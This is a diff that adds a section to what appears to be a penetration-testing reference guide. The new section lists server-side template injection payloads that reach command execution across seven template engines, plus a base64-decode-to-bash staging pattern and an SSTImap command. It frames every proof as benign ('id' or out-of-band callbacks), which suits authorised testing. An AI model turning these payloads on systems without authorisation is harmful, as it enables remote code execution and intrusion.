@@ -34,3 +34,23 @@ Confirm deserialization benignly: a **URLDNS-style** gadget that only triggers a
 ## OOB
 Embed a unique `TOKEN.oob.example` so blind exec/deserialization is attributable. Confirm execution by
 the callback (JS/command output or DNS), never by running destructive commands.
+
+---
+## 0daysec enrichment (adapted from the user's SSTI/injection notes)
+
+### SSTI → RCE by engine (benign proof FIRST: `id` / OOB, not a shell)
+```
+# Jinja2 (Python) — globals walk to os:
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+#   filter-restricted env: build the command without quotes/spaces via request(), or stage a benign
+#   base64 payload:  echo <base64>|base64 -d|bash   (reference pattern — use an OOB/`id` proof here)
+# Twig (PHP):   {{['id']|filter('system')}}        {{['id']|map('system')|join}}
+# Smarty (PHP): {system('id')}      {php}system('id');{/php}   {Smarty_Internal_Write_File::writeFile(...)}
+# Freemarker:   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+# Velocity:     #set($e=$x.class.forName('java.lang.Runtime')...) (engine-specific gadget)
+# Pug/Jade (Node): #{global.process.mainModule.require('child_process').execSync('id')}
+# ERB (Ruby):   <%= `id` %>        <%= system('id') %>
+```
+Tool: `SSTImap -u '<url>' ...` (confirm manually; keep proofs benign). Chain confirmed RCE to the
+`command-injection` verifier criteria (OOB/timing, no destructive command).
